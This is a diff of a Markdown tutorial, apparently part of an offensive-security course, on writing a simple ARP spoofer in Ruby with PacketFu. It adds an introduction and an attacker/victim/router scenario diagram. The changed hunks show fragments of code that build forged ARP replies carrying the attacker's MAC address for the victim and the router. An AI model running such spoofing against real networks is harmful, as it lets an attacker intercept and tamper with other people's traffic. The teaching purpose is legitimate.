@@ -1,8 +1,15 @@
 # ARP Spoofing
-As you know, ARP Spoofing attack in the core of MiTM attack.
+As you know, ARP Spoofing attack in the core of MiTM attacks. In this part we'll know how to wirte simple and effective arp spoofer tool in order to use it in later spoofing attacks.
 
-
-**Scenario**
+#### Scenario
+We have 3 machines in this senario as showen below.
+```
+             |Attacker|
+                 |
+                 ٧
+|Victim| -----------------> |Router| ---> Internet
+```
+Here the list of IP and MAC address of each of theme
 
 | Host/Info |   IP Address  |    MAC Address    |
 |-----------|:-------------:|:-----------------:|
@@ -86,7 +93,6 @@ info = PacketFu::Utils.whoami?(:iface => "wlan0")
 #
 # Victim
 #
-
 # Build Ethernet header
 arp_packet_victim = PacketFu::ARPPacket.new
 arp_packet_victim.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
@@ -101,7 +107,6 @@ arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP repl
 #
 # Router
 #
-
 # Build Ethernet header
 arp_packet_router = PacketFu::ARPPacket.new
 arp_packet_router.eth_saddr = "3C:77:E6:68:66:E9"       # our MAC address
